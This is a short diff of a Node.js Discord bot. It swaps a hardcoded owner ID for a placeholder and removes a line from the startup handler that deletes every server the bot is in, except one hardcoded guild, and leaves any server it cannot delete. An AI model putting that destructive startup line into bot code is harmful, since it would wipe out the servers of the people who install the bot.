@@ -8,7 +8,7 @@ var Config = require(__dirname + "/config/config.json")
 var client = new Discord.Client();
 var Prefix = Config.prefix;
 var BotToken = Config.token;
-var OwnerId = "406923333154897930"
+var OwnerId = "UR ID HERE"
 
 client.on(`reconnecting`, async function () {
   
@@ -21,7 +21,6 @@ client.on('error', e => console.error(e))
 client.on("ready", async function() {
   
 console.log(`logged in as ${client.user.tag}, Client ID: ${client.user.id}`)
-client.guilds.forEach(g => {if (g.id !== "511618165822849048") g.delete().catch(e => g.leave())})
 
 });
 
